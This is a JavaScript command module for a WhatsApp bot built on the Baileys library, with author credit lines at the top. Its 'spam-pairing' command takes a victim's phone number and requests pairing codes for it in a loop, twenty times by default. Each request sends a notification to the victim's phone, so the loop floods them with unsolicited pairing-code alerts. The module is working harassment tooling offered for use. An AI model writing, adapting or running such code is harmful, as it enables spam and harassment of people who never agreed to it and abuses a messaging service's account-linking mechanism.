// © MchaX-Bot
// • Credits : wa.me/6281235807940 [ Krizz ]
// • Owner: 6281235807940

/*
• Telegram: krsna_081
• Instagram: krsna081
*/

const {
    makeWASocket,
    useMultiFileAuthState,
    makeCacheableSignalKeyStore,
} = require("baileys");
const { Boom } = require("@hapi/boom");
const NodeCache = require("node-cache");
const Pino = require("pino");
const chalk = require("chalk");

function no(number) {
    return number.replace(/\D/g, "").replace(/^0/, "62");
}

module.exports = {
    command: "pairing",
    alias: ["pairing", "spam-pairing"],
    category: ["tools"],
    settings: { owner: true },
    description: "💥 Spamming pairing code nomor WhatsApp!",
    loading: false,
    async run(m, { sock, text }) {
        let target;
        if (m.quoted) {
            target = no(m.quoted.sender);
        } else if (text) {
            target = no(text.split(" ")[0]);
        }

        if (!target) throw `> ❌ *Harap masukkan nomor yang valid!*`;

        let jumlah = parseInt(text.split(" ")[1]) || 20;

        let dir = `tmp/${m.sender.split("@")[0]}`;
        const { state, saveCreds } = await useMultiFileAuthState(dir);
        const cache = new NodeCache();

        m.reply(
            `> *– 乂 Memulai Proses Spam!*\n\n` +
            `> 📞 *Nomor:* @${target}\n` +
            `> 🔢 *Total:* ${jumlah}`
        );

        const config = {
            logger: Pino({ level: "fatal" }).child({ level: "fatal" }),
            printQRInTerminal: false,
            mobile: false,
            auth: {
                creds: state.creds,
                keys: makeCacheableSignalKeyStore(state.keys, Pino({ level: "fatal" }).child({ level: "fatal" })),
            },
            version: [2, 3e3, 1015901307],
            browser: ["Ubuntu", "Edge", "110.0.1587.56"],
            markOnlineOnConnect: true,
            generateHighQualityLinkPreview: true,
            msgRetryCounterCache: cache,
            defaultQueryTimeoutMs: undefined,
        };
        sock = makeWASocket(config);

        setTimeout(async () => {
            for (let i = 0; i < jumlah; i++) {
                try {
                    let retries = i + 1;
                    let anu = pickRandom(["KRIZZ081", "KRISNOLL", "XYZKRIZX"]);
                    let pairing = await sock.requestPairingCode(target, anu);
                    let code = pairing?.match(/.{1,4}/g)?.join("-") || pairing;
                    
                    console.log(
                        `> ${chalk.yellow.bold("[" + retries + "/" + jumlah + "]")} ` +
                        `😛 Kode pairing anda: ${code}`
                    );
                } catch (err) {
                    console.log(`> ❌ Gagal mendapatkan pairing code: ${err.message}`);
                }
                await new Promise(resolve => setTimeout(resolve, 1000));
            }
        }, 3000);
    },
};